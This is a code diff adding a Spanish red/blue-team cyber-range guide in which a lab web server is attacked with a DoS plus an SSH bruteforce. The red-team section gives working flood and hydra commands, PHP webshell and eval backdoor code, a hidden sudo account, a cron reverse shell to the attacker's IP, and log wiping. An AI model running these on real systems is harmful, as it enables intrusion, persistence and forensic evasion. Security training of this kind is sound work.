@@ -63,6 +63,7 @@ export const Icon: React.FC<IconProps> = ({ name, className, ...props }) => {
         'key': <><path d="M21 2l-2 2m-7.61 7.61a5.5 5.5 0 1 1-7.778 7.778 5.5 5.5 0 0 1 7.777-7.777zm0 0L15.5 7.5m0 0l3 3L22 7l-3-3m-3.5 3.5L19 4"/></>,
         'crosshair': <><circle cx="12" cy="12" r="10"/><line x1="22" y1="12" x2="18" y2="12"/><line x1="6" y1="12" x2="2" y2="12"/><line x1="12" y1="6" x2="12" y2="2"/><line x1="12" y1="22" x2="12" y2="18"/></>,
         'star': <path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"/>,
+        'bot': <><rect width="18" height="10" x="3" y="11" rx="2"/><circle cx="12" cy="5" r="2"/><path d="M12 7v4"/><line x1="8" x2="8" y1="16" y2="16"/><line x1="16" x2="16" y1="16" y2="16"/></>,
     };
 
     return (
@@ -455,6 +456,415 @@ Checklist de Ataque - Equipo Rojo
  index.php modificado (hash diferente)
  Persistencia establecida (opcional)
  Documentación de todos los pasos
+`;
+
+export const SCENARIO_8_GUIDE = `
+Escenario 8: Furia en la Red - Ataque Combinado
+📋 Información General
+Objetivo: Ataque combinado DoS + Bruteforce simultáneos contra PORTAL-WEB. El Equipo Azul debe priorizar y contener bajo presión extrema.
+Dificultad: Avanzado
+Equipos: Rojo vs Azul
+Duración estimada: 60-90 minutos
+Servidor objetivo: PORTAL-WEB (10.0.20.10)
+
+🎯 Objetivos del Escenario
+Equipo Azul (Defensor)
+
+Detectar y diagnosticar el ataque DoS
+Identificar el ataque de fuerza bruta en logs
+Bloquear la IP del atacante
+Verificar integridad de archivos del sistema
+Restaurar servicios si fueron comprometidos
+
+Equipo Rojo (Atacante)
+
+Lanzar ataque DoS para saturar el servidor
+Ejecutar fuerza bruta mientras el DoS cubre el rastro
+Obtener credenciales de administrador
+Comprometer el servidor y desplegar backdoor
+Mantener persistencia
+
+
+🔵 SOLUCIÓN COMPLETA - EQUIPO AZUL
+Fase 1: Diagnóstico Inicial (Bajo Presión)
+El servidor está bajo ataque. Tu primer trabajo es entender qué está pasando.
+bash# 1. Conectarse al servidor (puede estar lento)
+ssh blue-team@PORTAL-WEB
+# Contraseña: Bl#3T3@m!2024
+
+# 2. Verificar carga del sistema inmediatamente
+top
+# O mejor aún:
+htop
+
+# ⚠️ Lo que verás:
+# - CPU al 95-99% (señal de DoS)
+# - Múltiples conexiones de red activas
+# - Proceso específico consumiendo recursos
+Análisis de top/htop:
+Load average: 45.32, 38.21, 25.14  <- ANORMAL (debería ser < 2.0)
+%Cpu(s): 98.7 us  <- CPU casi al máximo
+Puntos ganados: 10 (por detectar DoS)
+Fase 2: Identificación del Ataque de Fuerza Bruta
+Mientras el sistema está saturado, hay otro ataque en paralelo.
+bash# 1. Revisar logs de autenticación
+journalctl -u sshd | tail -50
+
+# O con grep:
+grep "Failed" /var/log/auth.log | tail -30
+
+# 2. Ver en tiempo real
+tail -f /var/log/auth.log
+
+# ⚠️ Lo que verás:
+# Nov 18 10:15:32 PORTAL-WEB sshd[12345]: Failed password for admin from 192.168.1.100 port 45123 ssh2
+# Nov 18 10:15:33 PORTAL-WEB sshd[12346]: Failed password for admin from 192.168.1.100 port 45124 ssh2
+# Nov 18 10:15:34 PORTAL-WEB sshd[12347]: Failed password for admin from 192.168.1.100 port 45125 ssh2
+# [... cientos de líneas similares ...]
+
+# 3. Contar intentos fallidos
+grep "Failed password for admin" /var/log/auth.log | wc -l
+
+# 4. Identificar la IP del atacante
+grep "Failed password" /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -nr
+Puntos ganados: 10 (por detectar bruteforce)
+Fase 3: Contención Inmediata - CRÍTICO
+¡Esta es la acción más importante! Detén el sangrado AHORA.
+bash# 1. Bloquear la IP del atacante en el firewall
+sudo ufw deny from 192.168.1.100
+
+# 2. Verificar que la regla se aplicó
+sudo ufw status numbered
+
+# 3. Verificar que los ataques se detuvieron
+# Espera 30 segundos y luego revisa:
+tail /var/log/auth.log
+# Ya no deberías ver más intentos fallidos
+
+# 4. Verificar carga del CPU
+top
+# La carga debería empezar a bajar gradualmente
+
+# 5. Ver conexiones activas
+sudo ss -antp | grep 192.168.1.100
+# No deberías ver conexiones de esa IP
+Resultado esperado:
+
+CPU baja de 99% a ~10% en 1-2 minutos
+No más intentos de login fallidos
+Conexiones del atacante terminadas
+
+Puntos ganados: 25
+Fase 4: Análisis Post-Ataque
+Determina si el atacante tuvo éxito antes del bloqueo.
+bash# 1. Buscar logins exitosos
+grep "Accepted" /var/log/auth.log | grep "192.168.1.100"
+
+# Si ves algo como:
+# "Accepted password for admin from 192.168.1.100"
+# ⚠️ ¡El atacante entró!
+
+# 2. Ver sesiones activas
+who
+w
+
+# 3. Si hay una sesión sospechosa, terminarla
+sudo pkill -u admin
+# O más específico:
+sudo kill -9 <PID>
+
+# 4. Cambiar contraseña comprometida INMEDIATAMENTE
+sudo passwd admin
+Puntos ganados: 5 (bonus por respuesta rápida)
+Fase 5: Verificación de Integridad
+Determina si archivos fueron modificados.
+bash# 1. Verificar hash del archivo web principal
+sha256sum /var/www/html/index.php
+
+# Hash original conocido: original_hash_123
+# Si es diferente, el archivo fue modificado
+
+# 2. Buscar archivos sospechosos
+find /var/www/html -type f -mmin -60
+# Archivos modificados en los últimos 60 minutos
+
+# 3. Buscar webshells comunes
+find /var/www/html -name "*.php" -exec grep -l "system\|exec\|shell_exec" {} \;
+
+# 4. Revisar archivos recientemente modificados
+ls -alt /var/www/html/ | head -20
+
+# 5. Si encuentras un backdoor:
+cat /var/www/html/index.php
+# Si ves código malicioso, restaura desde backup:
+sudo rm /var/www/html/index.php
+sudo cp /var/backups/index.php.backup /var/www/html/index.php
+Puntos ganados: 20
+Fase 6: Hardening Post-Incidente
+Prevenir futuros ataques similares.
+bash# 1. Instalar y configurar Fail2Ban
+sudo apt update
+sudo apt install fail2ban -y
+
+# 2. Configurar jail de SSH
+sudo nano /etc/fail2ban/jail.local
+
+# Agregar:
+[sshd]
+enabled = true
+port = ssh
+filter = sshd
+logpath = /var/log/auth.log
+maxretry = 3
+bantime = 3600
+findtime = 600
+
+# 3. Reiniciar fail2ban
+sudo systemctl restart fail2ban
+sudo systemctl enable fail2ban
+
+# 4. Verificar que está funcionando
+sudo fail2ban-client status sshd
+
+# 5. Configurar límites de tasa en firewall
+sudo ufw limit ssh
+
+# 6. Implementar IP whitelisting si es posible
+sudo ufw allow from 10.10.0.0/16 to any port 22
+sudo ufw deny from any to any port 22
+Puntos ganados: 10 (bonus por fail2ban)
+Fase 7: Restauración del Sistema
+Si el servidor fue comprometido, restaura a estado limpio.
+bash# 1. Matar procesos sospechosos
+ps aux | grep -v "grep" | grep -i "shell\|backdoor"
+sudo kill -9 <PID>
+
+# 2. Eliminar backdoors
+sudo rm /var/www/html/shell.php
+sudo rm /var/www/html/.hidden_backdoor.php
+
+# 3. Restaurar archivos desde backup
+sudo cp /var/backups/index.php.backup /var/www/html/index.php
+
+# 4. Verificar permisos
+sudo chmod 644 /var/www/html/*.php
+sudo chown www-data:www-data /var/www/html/*.php
+
+# 5. Reiniciar servicios web
+sudo systemctl restart nginx
+
+# 6. Verificar que el sitio funciona
+curl http://PORTAL-WEB
+Puntos ganados: 25
+Checklist Completo - Equipo Azul
+
+ DoS detectado con top/htop (CPU > 90%)
+ Bruteforce identificado en logs
+ IP del atacante identificada (192.168.1.100)
+ IP bloqueada con UFW
+ Carga del sistema normalizada
+ Login exitoso del atacante verificado
+ Sesiones maliciosas terminadas
+ Integridad de archivos verificada
+ Backdoors eliminados (si existen)
+ Sistema restaurado a estado limpio
+ Fail2Ban instalado y configurado
+ Contraseñas comprometidas cambiadas
+
+
+🔴 SOLUCIÓN COMPLETA - EQUIPO ROJO
+Fase 1: Preparación del Ataque
+Planifica el ataque combinado.
+bash# 1. Desde tu terminal soc-valtorix
+# Verificar que el objetivo está arriba
+ping PORTAL-WEB
+
+# 2. Reconocimiento rápido
+nmap -sV PORTAL-WEB
+# Confirma que SSH (22) y HTTP (80) están abiertos
+
+# 3. Preparar herramientas
+which hping3  # Para DoS
+which hydra   # Para bruteforce
+Fase 2: Lanzar Ataque DoS
+Satura el servidor para crear caos y cubrir el bruteforce.
+bash# 1. Ataque SYN Flood con hping3
+hping3 --flood -S -p 80 PORTAL-WEB
+
+# Alternativas:
+# TCP flood en múltiples puertos
+hping3 --flood -S -p 22,80,443 PORTAL-WEB
+
+# UDP flood
+hping3 --flood --udp -p 80 PORTAL-WEB
+
+# 2. Verificar que el ataque está funcionando
+# En otra terminal, mide la respuesta:
+ping PORTAL-WEB
+# Deberías ver latencia muy alta (>1000ms) o timeouts
+
+# 3. Monitorear el impacto
+# Si tienes acceso, verifica CPU del servidor:
+# top en PORTAL-WEB debería mostrar 95%+ de uso
+⚠️ Importante:
+
+Mantén el ataque DoS corriendo en una terminal dedicada
+No lo detengas hasta completar la fase de bruteforce
+El DoS crea "ruido" que dificulta la detección del bruteforce
+
+Puntos ganados: 20
+Fase 3: Ataque de Fuerza Bruta (Simultáneo)
+Mientras el DoS está activo, lanza el bruteforce en otra terminal.
+bash# 1. En una NUEVA terminal (no cierres la del DoS)
+# Ataque de fuerza bruta contra admin
+hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://PORTAL-WEB -t 16 -V
+
+# Opciones explicadas:
+# -l admin: usuario objetivo
+# -P rockyou.txt: lista de contraseñas
+# -t 16: 16 threads (paralelismo)
+# -V: verbose (ver cada intento)
+
+# 2. Cuando encuentre la contraseña, verás:
+# [22][ssh] host: PORTAL-WEB login: admin password: P@ssw0rd
+Estrategia:
+
+El DoS hace que el monitoreo sea difícil
+Los logs se llenan de eventos del DoS
+El bruteforce se "esconde" en el ruido
+Ventana de tiempo: ~5-10 minutos antes de detección
+
+Puntos ganados: 30
+Fase 4: Acceso y Despliegue de Backdoor
+Una vez que tienes credenciales, actúa RÁPIDO.
+bash# 1. Detener el ataque DoS (Ctrl+C en esa terminal)
+
+# 2. Conectar vía SSH inmediatamente
+ssh admin@PORTAL-WEB
+# Contraseña: P@ssw0rd (la que encontró hydra)
+
+# 3. Verificar acceso
+whoami  # admin
+id      # ver grupos
+
+# 4. Desplegar webshell simple
+cat > /var/www/html/shell.php << 'EOF'
+<?php
+if(isset($_GET['cmd'])){
+    echo "<pre>";
+    system($_GET['cmd']);
+    echo "</pre>";
+}
+?>
+EOF
+
+# 5. Verificar que funciona
+curl "http://PORTAL-WEB/shell.php?cmd=whoami"
+# Debería retornar: www-data
+
+# 6. Modificar index.php para demostrar compromiso
+cp /var/www/html/index.php /tmp/index.php.bak
+cat > /var/www/html/index.php << 'EOF'
+<?php
+echo "<!DOCTYPE html><html><body style='background-color:black; color:red;'>";
+echo "<h1>🔥 PORTAL-WEB COMPROMISED 🔥</h1>";
+echo "<p>Red Team was here</p>";
+echo "<p style='font-size:10px;'>Timestamp: " . date('Y-m-d H:i:s') . "</p>";
+echo "</body></html>";
+?>
+EOF
+
+# 7. Verificar
+curl http://PORTAL-WEB
+Puntos ganados: 35
+Fase 5: Persistencia Avanzada
+Asegura que mantendrás acceso incluso si detectan y bloquean.
+Método 1: Cuenta Backdoor
+bash# 1. Crear usuario oculto del sistema
+sudo useradd -m -s /bin/bash .update-daemon
+
+# 2. Dar privilegios sudo
+sudo usermod -aG sudo .update-daemon
+
+# 3. Establecer contraseña
+echo ".update-daemon:Backd00rP@ss" | sudo chpasswd
+
+# 4. Ocultar el usuario (opcional)
+# Editar /etc/passwd para que no aparezca en 'who'
+Método 2: Cronjob Reverse Shell
+bash# 1. Crear script de reverse shell
+cat > /tmp/.system-update.sh << 'EOF'
+#!/bin/bash
+bash -i >& /dev/tcp/192.168.1.100/4444 0>&1
+EOF
+
+chmod +x /tmp/.system-update.sh
+
+# 2. Agregar al crontab
+(crontab -l 2>/dev/null; echo "*/5 * * * * /tmp/.system-update.sh") | crontab -
+
+# 3. En tu Kali, listener:
+nc -lvnp 4444
+Método 3: SSH Key Backdoor
+bash# 1. En tu Kali, generar clave
+ssh-keygen -t rsa -b 4096 -f ~/.ssh/portal_backdoor -N ""
+
+# 2. Copiar clave pública al servidor
+# (Estando conectado como admin)
+mkdir -p ~/.ssh
+cat >> ~/.ssh/authorized_keys << 'EOF'
+ssh-rsa AAAAB3NzaC... tu-clave-publica-aqui
+EOF
+chmod 600 ~/.ssh/authorized_keys
+
+# 3. Ahora puedes conectar sin contraseña
+ssh -i ~/.ssh/portal_backdoor admin@PORTAL-WEB
+Método 4: Backdoor en Módulo PHP
+bash# 1. Crear backdoor más sofisticado
+cat > /var/www/html/media/cache/.system.php << 'EOF'
+<?php
+if(md5($_GET['auth']) == 'e10adc3949ba59abbe56e057f20f883e'){
+    eval(base64_decode($_POST['cmd']));
+}
+?>
+EOF
+
+# 2. Uso:
+# La contraseña es: 123456 (MD5: e10adc3949ba59abbe56e057f20f883e)
+# URL: http://PORTAL-WEB/media/cache/.system.php?auth=123456
+# POST data: cmd=base64_encoded_command
+Puntos ganados: 15 (bonus por persistencia)
+Fase 6: Limpieza de Rastros (Avanzado)
+Dificulta la investigación forense.
+bash# 1. Limpiar logs de autenticación
+sudo truncate -s 0 /var/log/auth.log
+
+# O más selectivo:
+sudo sed -i '/admin/d' /var/log/auth.log
+
+# 2. Limpiar historial de bash
+history -c
+rm ~/.bash_history
+ln -s /dev/null ~/.bash_history
+
+# 3. Limpiar logs web
+sudo truncate -s 0 /var/log/nginx/access.log
+sudo truncate -s 0 /var/log/nginx/error.log
+
+# 4. Modificar timestamps de archivos
+touch -r /etc/passwd /var/www/html/shell.php
+⚠️ Nota Ética: Esta fase es solo para entrenamiento. En un pentest real, NUNCA borres logs sin autorización explícita.
+Puntos ganados: 5 (bonus por evasión)
+Checklist de Ataque - Equipo Rojo
+
+ DoS lanzado exitosamente (CPU > 90%)
+ Bruteforce ejecutado durante el DoS
+ Credenciales de admin obtenidas
+ Acceso SSH conseguido
+ Webshell desplegado
+ index.php modificado (hash diferente)
+ Al menos un método de persistencia implementado
+ Rastros parcialmente limpiados (opcional)
 `;
 
 export const GLOSSARY_TERMS: GlossaryTerm[] = [
